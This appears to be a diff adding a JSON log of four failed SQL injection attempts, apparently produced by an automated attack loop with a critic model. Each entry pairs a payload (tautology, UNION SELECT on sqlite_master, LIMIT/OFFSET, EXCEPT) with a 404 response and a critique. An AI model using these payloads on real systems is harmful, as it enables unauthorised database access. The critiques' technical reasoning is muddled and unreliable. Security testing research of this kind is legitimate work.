@@ -1,0 +1,34 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "' OR 'x'='x' OR '1'='1' --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload failed to breach the SQLi vulnerability because the ' OR 'x'='x' OR '1'='1' -- payload is likely being interpreted as a string literal within the SQL query, rather than an actual SQL syntax error.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "' UNION SELECT * FROM sqlite_master WHERE name='sqlite_master' --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload failed to breach the SQLi vulnerability because the '--' comment is being treated as a string literal, not a comment, due to the presence of a preceding string.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "' LIMIT 1 OFFSET 999999999 --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload ' LIMIT 1 OFFSET 999999999 --' failed to breach the SQLi vulnerability because it was likely interpreted as a valid SQL query fragment, rather than a complete query, resulting in a 404 error due to an invalid offset value.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 4,
+        "vuln_type": "sqli",
+        "payload": "' EXCEPT SELECT 1 --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload ' EXCEPT SELECT 1 --' failed to breach the SQLi vulnerability because the 'EXCEPT' keyword is not recognized as a valid SQL syntax in the context of the given response body, indicating that the payload did not successfully break out of the application's string literal.",
+        "outcome": "failed"
+    }
+]
